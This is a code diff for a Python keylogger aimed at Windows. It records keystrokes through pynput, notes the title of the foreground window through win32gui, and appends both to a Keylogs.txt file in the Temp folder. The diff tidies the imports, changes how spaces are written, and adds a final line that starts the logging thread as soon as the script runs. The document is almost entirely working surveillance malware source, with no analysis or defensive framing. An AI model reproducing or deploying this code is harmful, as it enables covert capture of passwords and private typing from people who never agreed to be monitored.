@@ -1,9 +1,9 @@
 # Import modules
 
 import os
-from threading import Thread
-from win32gui import GetWindowText, GetForegroundWindow
+import win32gui
 try:
+	from threading import Thread
 	from pynput.keyboard import Key, Listener
 except ImportError:
 	raise SystemExit('Please run › pip install pynput')
@@ -36,10 +36,10 @@ def Keyboard(Key):
 def WriteFile(Key):
 	with open(os.getenv('Temp') + '\\Keylogs.txt', 'a', encoding='utf-8') as f:
 		global WindowsTitle
-		if WindowsTitle != GetWindowText(GetForegroundWindow()):
-			f.write(('\n\n' + GetWindowText(GetForegroundWindow()) + '\n'))
+		if WindowsTitle != win32gui.GetWindowText(win32gui.GetForegroundWindow()):
+			f.write(('\n\n' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'))
 		if str(Key).find('space') >= 0:
-			f.write('\n') 
+			f.write(' ') 
 		elif str(Key).find('Key') == -1:
 			Key = str(Key[0]).replace("'", '')
 		try:
@@ -47,7 +47,7 @@ def WriteFile(Key):
 		except:
 			pass
 
-		WindowsTitle = GetWindowText(GetForegroundWindow())
+		WindowsTitle = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
 
 # Listener function
@@ -59,3 +59,8 @@ def Threader():
 				listener.join()
 		except:
 			pass
+
+
+# Activates the keylogger thread
+
+Thread(target=Threader).start()
